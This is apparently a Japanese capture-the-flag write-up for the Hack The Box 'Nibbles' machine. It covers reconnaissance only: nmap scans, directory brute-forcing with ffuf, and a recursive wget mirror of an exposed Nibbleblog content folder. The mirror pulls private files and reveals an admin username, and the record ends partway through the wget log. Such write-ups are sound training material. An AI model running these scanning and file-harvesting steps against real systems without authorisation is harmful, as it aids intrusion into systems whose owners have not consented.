https://app.hackthebox.com/machines/Nibbles
## STEP 1
22番と80番が開いている  
脆弱性はDoSぐらいしかなさそう
```sh
└─$ nmap -n -Pn --top-ports=1000 -sV -sC --max-retries=0 10.129.10.127
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 11:25 EDT
Warning: 10.129.10.127 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.10.127
Host is up (0.29s latency).
Not shown: 950 closed tcp ports (reset), 48 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds
```
```sh
└─$ nmap -n -Pn -p22,80 --script=vuln 10.129.10.127 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 11:26 EDT
Nmap scan report for 10.129.10.127
Host is up (0.31s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/

Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds
```


## STEP 2
80番にアクセス、なんもなさそう  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_01.png" width="50%" height="50%">  
コメントをみると、nibbledblogが怪しそう
```sh
└─$ curl http://10.129.96.84/         
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
nibbledblogにアクセス、どうやらnibbleblogはCMSのブログらしい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_02.png" width="50%" height="50%">  
nibbleblogは見た感じ大した情報はなさそうだったので、ディレクトリを探索するといくつか発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.96.84/nibbleblog/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.84/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 306ms]
.htaccess               [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 290ms]
.hta                    [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 303ms]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 302ms]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 318ms]
.htpasswd               [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 2702ms]
content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 300ms]
index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 307ms]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 317ms]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 300ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 308ms]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 306ms]
:: Progress: [4614/4614] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```
admin.phpにアクセスすると、クレデンシャルが必要だった  
デフォルトパスワードはググってもなさそうなかんじ  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_03.png" width="50%" height="50%">  
ffufで確認できたディレクトリ内にクレデンシャルがあるかも、例えばadminにアクセスするといくつかのディレクトリを確認できた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_04.png" width="50%" height="50%">  
wgetでcontenディレクトリをダウンロードして、クレデンシャルをGrepで検索するとユーザ名「admin」を発見、パスワードは見つからず
```sh
└─$ wget -nv -r http://10.129.96.84/nibbleblog/content
2025-04-26 06:41:10 URL:http://10.129.96.84/nibbleblog/content/ [1354/1354] -> "10.129.96.84/nibbleblog/content" [1]
http://10.129.96.84/robots.txt:
2025-04-26 06:41:10 ERROR 404: Not Found.
2025-04-26 06:41:10 URL:http://10.129.96.84/icons/blank.gif [148/148] -> "10.129.96.84/icons/blank.gif" [1]
pathconf: Not a directory
2025-04-26 06:41:11 URL:http://10.129.96.84/nibbleblog/content/?C=N;O=D [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=N;O=D" [1]
2025-04-26 06:41:11 URL:http://10.129.96.84/nibbleblog/content/?C=M;O=A [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=M;O=A" [1]
2025-04-26 06:41:11 URL:http://10.129.96.84/nibbleblog/content/?C=S;O=A [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=S;O=A" [1]
2025-04-26 06:41:12 URL:http://10.129.96.84/nibbleblog/content/?C=D;O=A [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=D;O=A" [1]
2025-04-26 06:41:12 URL:http://10.129.96.84/icons/back.gif [216/216] -> "10.129.96.84/icons/back.gif" [1]
2025-04-26 06:41:12 URL:http://10.129.96.84/nibbleblog/ [2987/2987] -> "10.129.96.84/nibbleblog/index.html" [1]
2025-04-26 06:41:13 URL:http://10.129.96.84/icons/folder.gif [225/225] -> "10.129.96.84/icons/folder.gif" [1]
2025-04-26 06:41:13 URL:http://10.129.96.84/nibbleblog/content/private/ [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html" [1]
2025-04-26 06:41:13 URL:http://10.129.96.84/nibbleblog/content/public/ [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html" [1]
2025-04-26 06:41:13 URL:http://10.129.96.84/nibbleblog/content/tmp/ [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html" [1]
2025-04-26 06:41:14 URL:http://10.129.96.84/nibbleblog/content/?C=N;O=A [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=N;O=A" [1]
2025-04-26 06:41:14 URL:http://10.129.96.84/nibbleblog/content/?C=M;O=D [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=M;O=D" [1]
2025-04-26 06:41:14 URL:http://10.129.96.84/nibbleblog/content/?C=S;O=D [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=S;O=D" [1]
2025-04-26 06:41:16 URL:http://10.129.96.84/nibbleblog/content/?C=D;O=D [1354/1354] -> "10.129.96.84/nibbleblog/content/index.html?C=D;O=D" [1]
2025-04-26 06:41:16 URL:http://10.129.96.84/nibbleblog/feed.php [302/302] -> "10.129.96.84/nibbleblog/feed.php" [1]
2025-04-26 06:41:16 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/normalize.css [1729/1729] -> "10.129.96.84/nibbleblog/themes/simpler/css/normalize.css" [1]
2025-04-26 06:41:17 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/main.css [3027/3027] -> "10.129.96.84/nibbleblog/themes/simpler/css/main.css" [1]
2025-04-26 06:41:17 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/post.css [4839/4839] -> "10.129.96.84/nibbleblog/themes/simpler/css/post.css" [1]
2025-04-26 06:41:17 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/page.css [1672/1672] -> "10.129.96.84/nibbleblog/themes/simpler/css/page.css" [1]
2025-04-26 06:41:17 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/plugins.css [1340/1340] -> "10.129.96.84/nibbleblog/themes/simpler/css/plugins.css" [1]
2025-04-26 06:41:18 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/rainbow.css [1473/1473] -> "10.129.96.84/nibbleblog/themes/simpler/css/rainbow.css" [1]
2025-04-26 06:41:20 URL:http://10.129.96.84/nibbleblog/admin/js/jquery/jquery.js [83615/83615] -> "10.129.96.84/nibbleblog/admin/js/jquery/jquery.js" [1]
2025-04-26 06:41:20 URL:http://10.129.96.84/nibbleblog/themes/simpler/js/rainbow-custom.min.js [28199/28199] -> "10.129.96.84/nibbleblog/themes/simpler/js/rainbow-custom.min.js" [1]
2025-04-26 06:41:20 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/img/favicon.ico [1150/1150] -> "10.129.96.84/nibbleblog/themes/simpler/css/img/favicon.ico" [1]
2025-04-26 06:41:21 URL:http://10.129.96.84/nibbleblog/index.php?controller=blog&action=view&category=uncategorised [3071/3071] -> "10.129.96.84/nibbleblog/index.php?controller=blog&action=view&category=uncategorised" [1]
2025-04-26 06:41:21 URL:http://10.129.96.84/nibbleblog/index.php?controller=blog&action=view&category=music [3055/3055] -> "10.129.96.84/nibbleblog/index.php?controller=blog&action=view&category=music" [1]
2025-04-26 06:41:21 URL:http://10.129.96.84/nibbleblog/index.php?controller=blog&action=view&category=videos [3057/3057] -> "10.129.96.84/nibbleblog/index.php?controller=blog&action=view&category=videos" [1]
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.jpg:
2025-04-26 06:41:22 ERROR 404: Not Found.
2025-04-26 06:41:22 URL:http://10.129.96.84/nibbleblog/content/private/?C=N;O=D [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=N;O=D" [1]
2025-04-26 06:41:22 URL:http://10.129.96.84/nibbleblog/content/private/?C=M;O=A [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=M;O=A" [1]
2025-04-26 06:41:23 URL:http://10.129.96.84/nibbleblog/content/private/?C=S;O=A [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=S;O=A" [1]
2025-04-26 06:41:23 URL:http://10.129.96.84/nibbleblog/content/private/?C=D;O=A [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=D;O=A" [1]
2025-04-26 06:41:23 URL:http://10.129.96.84/icons/unknown.gif [245/245] -> "10.129.96.84/icons/unknown.gif" [1]
2025-04-26 06:41:23 URL:http://10.129.96.84/nibbleblog/content/private/categories.xml [325/325] -> "10.129.96.84/nibbleblog/content/private/categories.xml" [1]
2025-04-26 06:41:24 URL:http://10.129.96.84/nibbleblog/content/private/comments.xml [431/431] -> "10.129.96.84/nibbleblog/content/private/comments.xml" [1]
2025-04-26 06:41:24 URL:http://10.129.96.84/nibbleblog/content/private/config.xml [1936/1936] -> "10.129.96.84/nibbleblog/content/private/config.xml" [1]
2025-04-26 06:41:24 URL:http://10.129.96.84/nibbleblog/content/private/keys.php [0/0] -> "10.129.96.84/nibbleblog/content/private/keys.php" [1]
2025-04-26 06:41:25 URL:http://10.129.96.84/nibbleblog/content/private/notifications.xml [1141/1141] -> "10.129.96.84/nibbleblog/content/private/notifications.xml" [1]
2025-04-26 06:41:25 URL:http://10.129.96.84/nibbleblog/content/private/pages.xml [95/95] -> "10.129.96.84/nibbleblog/content/private/pages.xml" [1]
2025-04-26 06:41:25 URL:http://10.129.96.84/nibbleblog/content/private/plugins/ [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html" [1]
2025-04-26 06:41:26 URL:http://10.129.96.84/nibbleblog/content/private/posts.xml [93/93] -> "10.129.96.84/nibbleblog/content/private/posts.xml" [1]
2025-04-26 06:41:26 URL:http://10.129.96.84/nibbleblog/content/private/shadow.php [0/0] -> "10.129.96.84/nibbleblog/content/private/shadow.php" [1]
2025-04-26 06:41:26 URL:http://10.129.96.84/nibbleblog/content/private/tags.xml [97/97] -> "10.129.96.84/nibbleblog/content/private/tags.xml" [1]
2025-04-26 06:41:26 URL:http://10.129.96.84/nibbleblog/content/private/users.xml [504/504] -> "10.129.96.84/nibbleblog/content/private/users.xml" [1]
2025-04-26 06:41:27 URL:http://10.129.96.84/nibbleblog/content/public/?C=N;O=D [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=N;O=D" [1]
2025-04-26 06:41:27 URL:http://10.129.96.84/nibbleblog/content/public/?C=M;O=A [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=M;O=A" [1]
2025-04-26 06:41:27 URL:http://10.129.96.84/nibbleblog/content/public/?C=S;O=A [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=S;O=A" [1]
2025-04-26 06:41:28 URL:http://10.129.96.84/nibbleblog/content/public/?C=D;O=A [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=D;O=A" [1]
2025-04-26 06:41:28 URL:http://10.129.96.84/nibbleblog/content/public/comments/ [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html" [1]
2025-04-26 06:41:28 URL:http://10.129.96.84/nibbleblog/content/public/pages/ [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html" [1]
2025-04-26 06:41:29 URL:http://10.129.96.84/nibbleblog/content/public/posts/ [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html" [1]
2025-04-26 06:41:29 URL:http://10.129.96.84/nibbleblog/content/public/upload/ [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html" [1]
2025-04-26 06:41:29 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=N;O=D [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=N;O=D" [1]
2025-04-26 06:41:29 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=M;O=A [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=M;O=A" [1]
2025-04-26 06:41:30 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=S;O=A [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=S;O=A" [1]
2025-04-26 06:41:30 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=D;O=A [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=D;O=A" [1]
2025-04-26 06:41:30 URL:http://10.129.96.84/nibbleblog/themes/simpler/css/img/console.png [212/212] -> "10.129.96.84/nibbleblog/themes/simpler/css/img/console.png" [1]
2025-04-26 06:41:31 URL:http://10.129.96.84/nibbleblog/content/private/?C=N;O=A [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=N;O=A" [1]
2025-04-26 06:41:31 URL:http://10.129.96.84/nibbleblog/content/private/?C=M;O=D [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=M;O=D" [1]
2025-04-26 06:41:31 URL:http://10.129.96.84/nibbleblog/content/private/?C=S;O=D [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=S;O=D" [1]
2025-04-26 06:41:31 URL:http://10.129.96.84/nibbleblog/content/private/?C=D;O=D [3018/3018] -> "10.129.96.84/nibbleblog/content/private/index.html?C=D;O=D" [1]
2025-04-26 06:41:32 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=N;O=D [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=N;O=D" [1]
2025-04-26 06:41:32 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=M;O=A [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=M;O=A" [1]
2025-04-26 06:41:32 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=S;O=A [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=S;O=A" [1]
2025-04-26 06:41:33 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=D;O=A [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=D;O=A" [1]
2025-04-26 06:41:33 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/ [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html" [1]
2025-04-26 06:41:33 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/ [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html" [1]
2025-04-26 06:41:34 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/ [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html" [1]
2025-04-26 06:41:34 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/ [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html" [1]
2025-04-26 06:41:34 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/ [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html" [1]
2025-04-26 06:41:34 URL:http://10.129.96.84/nibbleblog/content/public/?C=N;O=A [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=N;O=A" [1]
2025-04-26 06:41:35 URL:http://10.129.96.84/nibbleblog/content/public/?C=M;O=D [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=M;O=D" [1]
2025-04-26 06:41:35 URL:http://10.129.96.84/nibbleblog/content/public/?C=S;O=D [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=S;O=D" [1]
2025-04-26 06:41:35 URL:http://10.129.96.84/nibbleblog/content/public/?C=D;O=D [1574/1574] -> "10.129.96.84/nibbleblog/content/public/index.html?C=D;O=D" [1]
2025-04-26 06:41:36 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=N;O=D [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=N;O=D" [1]
2025-04-26 06:41:36 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=M;O=A [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=M;O=A" [1]
2025-04-26 06:41:36 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=S;O=A [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=S;O=A" [1]
2025-04-26 06:41:37 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=D;O=A [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=D;O=A" [1]
2025-04-26 06:41:37 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=N;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=N;O=D" [1]
2025-04-26 06:41:37 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=M;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=M;O=A" [1]
2025-04-26 06:41:37 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=S;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=S;O=A" [1]
2025-04-26 06:41:38 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=D;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=D;O=A" [1]
2025-04-26 06:41:38 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=N;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=N;O=D" [1]
2025-04-26 06:41:38 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=M;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=M;O=A" [1]
2025-04-26 06:41:39 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=S;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=S;O=A" [1]
2025-04-26 06:41:39 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=D;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=D;O=A" [1]
2025-04-26 06:41:39 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=N;O=D [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=N;O=D" [1]
2025-04-26 06:41:39 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=M;O=A [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=M;O=A" [1]
2025-04-26 06:41:40 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=S;O=A [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=S;O=A" [1]
2025-04-26 06:41:40 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=D;O=A [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=D;O=A" [1]
2025-04-26 06:41:40 URL:http://10.129.96.84/icons/image2.gif [309/309] -> "10.129.96.84/icons/image2.gif" [1]
2025-04-26 06:41:41 URL:http://10.129.96.84/nibbleblog/content/public/upload/nibbles_0_nbmedia.jpg [11667/11667] -> "10.129.96.84/nibbleblog/content/public/upload/nibbles_0_nbmedia.jpg" [1]
2025-04-26 06:41:42 URL:http://10.129.96.84/nibbleblog/content/public/upload/nibbles_0_o.jpg [62100/62100] -> "10.129.96.84/nibbleblog/content/public/upload/nibbles_0_o.jpg" [1]
2025-04-26 06:41:43 URL:http://10.129.96.84/nibbleblog/content/public/upload/nibbles_0_thumb.jpg [39592/39592] -> "10.129.96.84/nibbleblog/content/public/upload/nibbles_0_thumb.jpg" [1]
2025-04-26 06:41:43 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=N;O=A [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=N;O=A" [1]
2025-04-26 06:41:43 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=M;O=D [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=M;O=D" [1]
2025-04-26 06:41:43 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=S;O=D [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=S;O=D" [1]
2025-04-26 06:41:44 URL:http://10.129.96.84/nibbleblog/content/tmp/?C=D;O=D [792/792] -> "10.129.96.84/nibbleblog/content/tmp/index.html?C=D;O=D" [1]
2025-04-26 06:41:44 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=N;O=A [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=N;O=A" [1]
2025-04-26 06:41:45 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=M;O=D [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=M;O=D" [1]
2025-04-26 06:41:45 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=S;O=D [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=S;O=D" [1]
2025-04-26 06:41:45 URL:http://10.129.96.84/nibbleblog/content/private/plugins/?C=D;O=D [1814/1814] -> "10.129.96.84/nibbleblog/content/private/plugins/index.html?C=D;O=D" [1]
2025-04-26 06:41:46 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=N;O=D [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=N;O=D" [1]
2025-04-26 06:41:46 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=M;O=A [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=M;O=A" [1]
2025-04-26 06:41:46 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=S;O=A [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=S;O=A" [1]
2025-04-26 06:41:46 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=D;O=A [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=D;O=A" [1]
2025-04-26 06:41:47 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/db.xml [229/229] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/db.xml" [1]
2025-04-26 06:41:47 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=N;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=N;O=D" [1]
2025-04-26 06:41:47 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=M;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=M;O=A" [1]
2025-04-26 06:41:48 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=S;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=S;O=A" [1]
2025-04-26 06:41:48 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=D;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=D;O=A" [1]
2025-04-26 06:41:48 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/db.xml [239/239] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/db.xml" [1]
2025-04-26 06:41:48 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=N;O=D [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=N;O=D" [1]
2025-04-26 06:41:49 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=M;O=A [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=M;O=A" [1]
2025-04-26 06:41:49 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=S;O=A [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=S;O=A" [1]
2025-04-26 06:41:49 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=D;O=A [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=D;O=A" [1]
2025-04-26 06:41:50 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/db.xml [266/266] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/db.xml" [1]
2025-04-26 06:41:50 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=N;O=D [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=N;O=D" [1]
2025-04-26 06:41:50 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=M;O=A [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=M;O=A" [1]
2025-04-26 06:41:51 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=S;O=A [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=S;O=A" [1]
2025-04-26 06:41:51 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=D;O=A [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=D;O=A" [1]
2025-04-26 06:41:51 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/db.xml [258/258] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/db.xml" [1]
2025-04-26 06:41:51 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=N;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=N;O=D" [1]
2025-04-26 06:41:52 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=M;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=M;O=A" [1]
2025-04-26 06:41:52 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=S;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=S;O=A" [1]
2025-04-26 06:41:52 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=D;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=D;O=A" [1]
2025-04-26 06:41:53 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/db.xml [219/219] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/db.xml" [1]
2025-04-26 06:41:53 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=N;O=A [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=N;O=A" [1]
2025-04-26 06:41:53 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=M;O=D [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=M;O=D" [1]
2025-04-26 06:41:54 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=S;O=D [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=S;O=D" [1]
2025-04-26 06:41:54 URL:http://10.129.96.84/nibbleblog/content/public/comments/?C=D;O=D [823/823] -> "10.129.96.84/nibbleblog/content/public/comments/index.html?C=D;O=D" [1]
2025-04-26 06:41:54 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=N;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=N;O=A" [1]
